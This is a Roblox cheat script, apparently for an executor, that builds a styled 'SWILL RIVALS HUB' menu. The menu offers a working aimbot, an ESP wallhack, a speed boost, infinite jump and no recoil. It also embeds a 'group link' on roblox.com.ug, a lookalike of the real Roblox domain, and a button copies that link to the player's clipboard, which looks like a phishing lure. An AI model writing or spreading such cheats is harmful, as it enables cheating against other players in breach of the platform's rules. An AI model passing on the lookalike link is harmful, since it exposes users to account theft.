-- =====================================================
-- SWILL RIVALS HUB - ADMIN EDITION
-- Open: RIGHT SHIFT | Unlimited Access (No Trial)
-- Premium Design | All Cheats Included
-- =====================================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = workspace.CurrentCamera
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local GROUP_LINK = "https://roblox.com.ug/communities/9331768180/"

-- ========== ADMIN MODE - NO TRIAL ==========
local adminMode = true  -- Unlimited access
local menuVisible = false

-- Copy function
local function copyLink()
    if setclipboard then pcall(setclipboard, GROUP_LINK)
    elseif toclipboard then pcall(toclipboard, GROUP_LINK)
    elseif syn and syn.clipboard then pcall(syn.clipboard, GROUP_LINK)
    end
end

-- ========== CREATE GUI ==========
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SWILL_Admin"
screenGui.ResetOnSpawn = false
screenGui.Parent = CoreGui

-- Blur background effect
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting

-- Main Menu Frame (Glassmorphism)
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 520, 0, 480)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -240)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
mainFrame.BackgroundTransparency = 0.15
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

-- Outer glow
local glow = Instance.new("Frame")
glow.Size = UDim2.new(1, 10, 1, 10)
glow.Position = UDim2.new(0, -5, 0, -5)
glow.BackgroundColor3 = Color3.fromRGB(255, 70, 120)
glow.BackgroundTransparency = 0.7
glow.BorderSizePixel = 0
glow.Parent = mainFrame
local glowCorner = Instance.new("UICorner", glow)
glowCorner.CornerRadius = UDim.new(0, 16)

-- Main container
local container = Instance.new("Frame")
container.Size = UDim2.new(1, 0, 1, 0)
container.BackgroundColor3 = Color3.fromRGB(18, 18, 35)
container.BackgroundTransparency = 0.2
container.BorderSizePixel = 1
container.BorderColor3 = Color3.fromRGB(255, 100, 130)
container.Parent = mainFrame
local containerCorner = Instance.new("UICorner", container)
containerCorner.CornerRadius = UDim.new(0, 14)

-- Inner glass effect
local glass = Instance.new("Frame")
glass.Size = UDim2.new(1, 0, 1, 0)
glass.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
glass.BackgroundTransparency = 0.05
glass.BorderSizePixel = 0
glass.Parent = container
local glassCorner = Instance.new("UICorner", glass)
glassCorner.CornerRadius = UDim.new(0, 14)

-- Title Bar with Gradient
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 55)
titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 55)
titleBar.BackgroundTransparency = 0.3
titleBar.BorderSizePixel = 0
titleBar.Parent = container
local titleCorner = Instance.new("UICorner", titleBar)
titleCorner.CornerRadius = UDim.new(0, 14)

local titleGradient = Instance.new("UIGradient", titleBar)
titleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 70)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 50))
})

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -70, 1, 0)
titleText.Position = UDim2.new(0, 20, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "SWILL RIVALS HUB"
titleText.TextColor3 = Color3.fromRGB(255, 120, 140)
titleText.TextSize = 22
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.TextYAlignment = Enum.TextYAlignment.Center
titleText.Parent = titleBar

-- Admin Badge
local adminBadge = Instance.new("Frame")
adminBadge.Size = UDim2.new(0, 80, 0, 28)
adminBadge.Position = UDim2.new(1, -170, 0, 13)
adminBadge.BackgroundColor3 = Color3.fromRGB(255, 80, 120)
adminBadge.BackgroundTransparency = 0
adminBadge.BorderSizePixel = 0
adminBadge.Parent = titleBar
local badgeCorner = Instance.new("UICorner", adminBadge)
badgeCorner.CornerRadius = UDim.new(0, 14)
local badgeText = Instance.new("TextLabel", adminBadge)
badgeText.Size = UDim2.new(1, 0, 1, 0)
badgeText.Text = "✦ ADMIN ✦"
badgeText.TextColor3 = Color3.fromRGB(255, 255, 255)
badgeText.TextSize = 12
badgeText.Font = Enum.Font.GothamBold

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 36, 0, 36)
closeBtn.Position = UDim2.new(1, -48, 0, 9)
closeBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 70)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 20
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = titleBar
local closeCorner = Instance.new("UICorner", closeBtn)
closeCorner.CornerRadius = UDim.new(0, 8)
closeBtn.MouseButton1Click:Connect(function()
    menuVisible = false
    mainFrame.Visible = false
end)

-- Tab Bar
local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, 0, 0, 48)
tabBar.Position = UDim2.new(0, 0, 0, 55)
tabBar.BackgroundColor3 = Color3.fromRGB(22, 22, 42)
tabBar.BackgroundTransparency = 0.2
tabBar.BorderSizePixel = 0
tabBar.Parent = container

local contentArea = Instance.new("Frame")
contentArea.Size = UDim2.new(1, -30, 1, -125)
contentArea.Position = UDim2.new(0, 15, 0, 103)
contentArea.BackgroundTransparency = 1
contentArea.Parent = container

-- Tabs
local tabs = {"CHEATS", "SETTINGS", "PROFILE", "ADMIN"}
local tabBtns = {}
local tabPages = {}

for i, tabName in ipairs(tabs) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 1, 0)
    btn.Position = UDim2.new(0, (i-1)*100, 0, 0)
    btn.BackgroundTransparency = 1
    btn.Text = tabName
    btn.TextColor3 = Color3.fromRGB(170, 170, 220)
    btn.TextSize = 14
    btn.Font = Enum.Font.GothamSemibold
    btn.Parent = tabBar
    tabBtns[tabName] = btn
    
    local page = Instance.new("ScrollingFrame")
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.ScrollBarThickness = 4
    page.ScrollBarImageColor3 = Color3.fromRGB(255, 100, 130)
    page.CanvasSize = UDim2.new(0, 0, 0, 0)
    page.Visible = (i == 1)
    page.Parent = contentArea
    tabPages[tabName] = page
end

local function selectTab(tabName)
    for name, btn in pairs(tabBtns) do
        btn.BackgroundTransparency = 1
        btn.TextColor3 = Color3.fromRGB(170, 170, 220)
        tabPages[name].Visible = false
    end
    tabBtns[tabName].BackgroundColor3 = Color3.fromRGB(255, 80, 120)
    tabBtns[tabName].BackgroundTransparency = 0.9
    tabBtns[tabName].TextColor3 = Color3.fromRGB(255, 255, 255)
    tabPages[tabName].Visible = true
end

for name, btn in pairs(tabBtns) do
    btn.MouseButton1Click:Connect(function() selectTab(name) end)
end

-- ========== TOGGLE COMPONENT ==========
local function createToggle(parent, text, yPos, callback)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, -20, 0, 50)
    frame.Position = UDim2.new(0, 10, 0, yPos)
    frame.BackgroundColor3 = Color3.fromRGB(32, 32, 50)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 1
    frame.BorderColor3 = Color3.fromRGB(55, 55, 80)
    frame.Parent = parent
    local frameCorner = Instance.new("UICorner", frame)
    frameCorner.CornerRadius = UDim.new(0, 10)
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 260, 1, 0)
    label.Position = UDim2.new(0, 18, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(230, 230, 255)
    label.TextSize = 14
    label.Font = Enum.Font.Gotham
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextYAlignment = Enum.TextYAlignment.Center
    label.Parent = frame
    
    local toggleBtn = Instance.new("Frame")
    toggleBtn.Size = UDim2.new(0, 56, 0, 30)
    toggleBtn.Position = UDim2.new(1, -72, 0, 10)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 95)
    toggleBtn.BorderSizePixel = 0
    toggleBtn.Parent = frame
    local toggleCorner = Instance.new("UICorner", toggleBtn)
    toggleCorner.CornerRadius = UDim.new(1, 0)
    
    local toggleCircle = Instance.new("Frame")
    toggleCircle.Size = UDim2.new(0, 24, 0, 24)
    toggleCircle.Position = UDim2.new(0, 3, 0, 3)
    toggleCircle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    toggleCircle.BorderSizePixel = 0
    toggleCircle.Parent = toggleBtn
    local circleCorner = Instance.new("UICorner", toggleCircle)
    circleCorner.CornerRadius = UDim.new(1, 0)
    
    local state = false
    local function setState(newState)
        state = newState
        local targetColor = state and Color3.fromRGB(255, 80, 120) or Color3.fromRGB(60, 60, 95)
        local targetPos = state and UDim2.new(1, -29, 0, 3) or UDim2.new(0, 3, 0, 3)
        TweenService:Create(toggleBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = targetColor}):Play()
        TweenService:Create(toggleCircle, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {Position = targetPos}):Play()
        callback(state)
    end
    
    toggleBtn.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            setState(not state)
        end
    end)
    
    return setState
end

-- ========== AIMBOT ==========
local aimbotOn = false
local aimbotConn = nil
local function findClosest()
    local closest, best = nil, 200
    local center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Head") then
            local pos, on = Camera:WorldToViewportPoint(plr.Character.Head.Position)
            if on then
                local dist = (Vector2.new(pos.X, pos.Y) - center).magnitude
                if dist < best then best = dist; closest = plr end
            end
        end
    end
    return closest
end

-- ========== CHEATS PAGE ==========
local cheatsPage = tabPages["CHEATS"]
local cy = 0

createToggle(cheatsPage, "AIMBOT", cy, function(s)
    aimbotOn = s
    if aimbotConn then aimbotConn:Disconnect() end
    if s then
        aimbotConn = RunService.RenderStepped:Connect(function()
            if aimbotOn then
                local t = findClosest()
                if t and t.Character then
                    local newCF = CFrame.new(Camera.CFrame.Position, t.Character.Head.Position)
                    Camera.CFrame = Camera.CFrame:Lerp(newCF, 0.85)
                end
            end
        end)
    end
end)
cy = cy + 58

createToggle(cheatsPage, "ESP (WALLHACK)", cy, function(s)
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character then
            local esp = plr.Character:FindFirstChild("SWILL_ESP")
            if s and not esp then
                esp = Instance.new("Highlight")
                esp.Name = "SWILL_ESP"
                esp.FillColor = Color3.fromRGB(255, 50, 100)
                esp.FillTransparency = 0.35
                esp.OutlineColor = Color3.fromRGB(255, 255, 255)
                esp.Parent = plr.Character
            elseif not s and esp then
                esp:Destroy()
            end
        end
    end
end)
cy = cy + 58

createToggle(cheatsPage, "SPEED BOOST (x2.5)", cy, function(s)
    local function apply()
        local c = LocalPlayer.Character
        if c and c:FindFirstChild("Humanoid") then
            c.Humanoid.WalkSpeed = s and 40 or 16
        end
    end
    apply()
    LocalPlayer.CharacterAdded:Connect(function() wait(0.5) apply() end)
end)
cy = cy + 58

local jumpConn = nil
createToggle(cheatsPage, "INFINITE JUMP", cy, function(s)
    if jumpConn then jumpConn:Disconnect() end
    if s then
        jumpConn = UserInputService.JumpRequest:Connect(function()
            local c = LocalPlayer.Character
            local h = c and c:FindFirstChild("Humanoid")
            if h and h:GetState() ~= Enum.HumanoidStateType.Jumping then
                h:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end)
    end
end)
cy = cy + 58

createToggle(cheatsPage, "NO RECOIL", cy, function(s)
    if s then
        RunService.Stepped:Connect(function()
            local tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if tool then
                for _, v in pairs(tool:GetDescendants()) do
                    if v.Name:lower() == "recoil" then pcall(function() v.Value = 0 end) end
                end
            end
        end)
    end
end)
cy = cy + 58

cheatsPage.CanvasSize = UDim2.new(0, 0, 0, cy + 40)

-- ========== SETTINGS PAGE ==========
local settingsPage = tabPages["SETTINGS"]
local sy = 0
createToggle(settingsPage, "VISIBLE CHECK (RAYCAST)", sy, function() end)
sy = sy + 58
createToggle(settingsPage, "MOVEMENT PREDICTION", sy, function() end)
settingsPage.CanvasSize = UDim2.new(0, 0, 0, 120)

-- ========== PROFILE PAGE ==========
local profilePage = tabPages["PROFILE"]

local avatar = Instance.new("Frame")
avatar.Size = UDim2.new(0, 75, 0, 75)
avatar.Position = UDim2.new(0, 20, 0, 20)
avatar.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
avatar.Parent = profilePage
local avatarCorner = Instance.new("UICorner", avatar)
avatarCorner.CornerRadius = UDim.new(1, 0)
local avatarLetter = Instance.new("TextLabel", avatar)
avatarLetter.Size = UDim2.new(1, 0, 1, 0)
avatarLetter.Text = string.sub(LocalPlayer.Name, 1, 1):upper()
avatarLetter.TextSize = 34
avatarLetter.Font = Enum.Font.GothamBold

local nameLabel = Instance.new("TextLabel", profilePage)
nameLabel.Size = UDim2.new(1, -115, 0, 30)
nameLabel.Position = UDim2.new(0, 115, 0, 30)
nameLabel.Text = LocalPlayer.Name
nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
nameLabel.TextSize = 20
nameLabel.Font = Enum.Font.GothamBold
nameLabel.TextXAlignment = Enum.TextXAlignment.Left

local idLabel = Instance.new("TextLabel", profilePage)
idLabel.Size = UDim2.new(1, -115, 0, 20)
idLabel.Position = UDim2.new(0, 115, 0, 55)
idLabel.Text = "User ID: " .. LocalPlayer.UserId
idLabel.TextColor3 = Color3.fromRGB(170, 170, 220)
idLabel.TextSize = 13
idLabel.TextXAlignment = Enum.TextXAlignment.Left

local statsBox = Instance.new("Frame")
statsBox.Size = UDim2.new(1, -40, 0, 120)
statsBox.Position = UDim2.new(0, 20, 0, 115)
statsBox.BackgroundColor3 = Color3.fromRGB(28, 28, 48)
statsBox.Parent = profilePage
local statsCorner = Instance.new("UICorner", statsBox)
statsCorner.CornerRadius = UDim.new(0, 10)
local statsText = Instance.new("TextLabel", statsBox)
statsText.Size = UDim2.new(1, -20, 1, 0)
statsText.Position = UDim2.new(0, 10, 0, 10)
statsText.Text = "KILLS: 0\nDEATHS: 0\nK/D: 0.00"
statsText.TextColor3 = Color3.fromRGB(210, 210, 250)
statsText.TextSize = 14
statsText.TextXAlignment = Enum.TextXAlignment.Left
statsText.TextYAlignment = Enum.TextYAlignment.Top

local function updateStats()
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        local k, d = 0, 0
        for _, v in pairs(ls:GetChildren()) do
            local n = v.Name:lower()
            if n:find("kill") then k = v.Value end
            if n:find("death") then d = v.Value end
        end
        local kd = d > 0 and string.format("%.2f", k/d) or k
        statsText.Text = "⚔️ KILLS: " .. k .. "\n💀 DEATHS: " .. d .. "\n📊 K/D RATIO: " .. kd
    end
end
updateStats()
spawn(function() while wait(3) do updateStats() end end)

profilePage.CanvasSize = UDim2.new(0, 0, 0, 280)

-- ========== ADMIN PAGE (UNLIMITED) ==========
local adminPage = tabPages["ADMIN"]

local adminCard = Instance.new("Frame")
adminCard.Size = UDim2.new(1, -40, 0, 180)
adminCard.Position = UDim2.new(0, 20, 0, 20)
adminCard.BackgroundColor3 = Color3.fromRGB(255, 80, 120)
adminCard.BackgroundTransparency = 0.85
adminCard.BorderSizePixel = 2
adminCard.BorderColor3 = Color3.fromRGB(255, 80, 120)
adminCard.Parent = adminPage
local adminCardCorner = Instance.new("UICorner", adminCard)
adminCardCorner.CornerRadius = UDim.new(0, 12)

local crownIcon = Instance.new("TextLabel", adminCard)
crownIcon.Size = UDim2.new(0, 60, 0, 60)
crownIcon.Position = UDim2.new(0.5, -30, 0, 20)
crownIcon.Text = "👑"
crownIcon.TextSize = 48
crownIcon.TextColor3 = Color3.fromRGB(255, 200, 0)
crownIcon.BackgroundTransparency = 1

local adminTitle = Instance.new("TextLabel", adminCard)
adminTitle.Size = UDim2.new(1, 0, 0, 30)
adminTitle.Position = UDim2.new(0, 0, 0, 85)
adminTitle.Text = "UNLIMITED ACCESS"
adminTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
adminTitle.TextSize = 20
adminTitle.Font = Enum.Font.GothamBold

local adminSub = Instance.new("TextLabel", adminCard)
adminSub.Size = UDim2.new(1, 0, 0, 25)
adminSub.Position = UDim2.new(0, 0, 0, 115)
adminSub.Text = "No trial limits - Full features"
adminSub.TextColor3 = Color3.fromRGB(200, 200, 255)
adminSub.TextSize = 13

local copyGroupBtn = Instance.new("TextButton", adminCard)
copyGroupBtn.Size = UDim2.new(0, 200, 0, 40)
copyGroupBtn.Position = UDim2.new(0.5, -100, 1, -50)
copyGroupBtn.Text = "COPY GROUP LINK"
copyGroupBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyGroupBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 120)
copyGroupBtn.Font = Enum.Font.GothamBold
local btnCorner = Instance.new("UICorner", copyGroupBtn)
btnCorner.CornerRadius = UDim.new(0, 8)
copyGroupBtn.MouseButton1Click:Connect(copyLink)

-- Unlimited indicator
local unlimitedFrame = Instance.new("Frame")
unlimitedFrame.Size = UDim2.new(1, -40, 0, 80)
unlimitedFrame.Position = UDim2.new(0, 20, 0, 220)
unlimitedFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 55)
unlimitedFrame.Parent = adminPage
local unfCorner = Instance.new("UICorner", unlimitedFrame)
unfCorner.CornerRadius = UDim.new(0, 10)

local checkIcon = Instance.new("TextLabel", unlimitedFrame)
checkIcon.Size = UDim2.new(0, 40, 1, 0)
checkIcon.Position = UDim2.new(0, 15, 0, 0)
checkIcon.Text = "✅"
checkIcon.TextSize = 28
checkIcon.TextXAlignment = Enum.TextXAlignment.Left

local unlimitedText = Instance.new("TextLabel", unlimitedFrame)
unlimitedText.Size = UDim2.new(1, -70, 0, 30)
unlimitedText.Position = UDim2.new(0, 65, 0, 15)
unlimitedText.Text = "Permanent License Active"
unlimitedText.TextColor3 = Color3.fromRGB(100, 255, 150)
unlimitedText.TextSize = 16
unlimitedText.Font = Enum.Font.GothamBold
unlimitedText.TextXAlignment = Enum.TextXAlignment.Left

local unlimitedSub = Instance.new("TextLabel", unlimitedFrame)
unlimitedSub.Size = UDim2.new(1, -70, 0, 25)
unlimitedSub.Position = UDim2.new(0, 65, 0, 42)
unlimitedSub.Text = "No time limits. No restrictions."
unlimitedSub.TextColor3 = Color3.fromRGB(180, 180, 240)
unlimitedSub.TextSize = 13
unlimitedSub.TextXAlignment = Enum.TextXAlignment.Left

adminPage.CanvasSize = UDim2.new(0, 0, 0, 340)

-- ========== STARTUP ==========
selectTab("CHEATS")

-- Open/Close with Right Shift
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        menuVisible = not menuVisible
        mainFrame.Visible = menuVisible
        if menuVisible then
            TweenService:Create(blur, TweenInfo.new(0.3), {Size = 8}):Play()
        else
            TweenService:Create(blur, TweenInfo.new(0.3), {Size = 0}):Play()
        end
    end
end)

-- Startup Animation
mainFrame.Visible = true
TweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundTransparency = 0.15}):Play()
wait(0.5)
mainFrame.Visible = false

-- Notification
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "SWILL RIVALS HUB",
        Text = "Press RIGHT SHIFT | ADMIN MODE (Unlimited)",
        Duration = 4,
        Icon = ""
    })
end)

print("========================================")
print("SWILL RIVALS HUB - ADMIN EDITION")
print("Press RIGHT SHIFT to open menu")
print("UNLIMITED ACCESS - No trial limits")
print("========================================")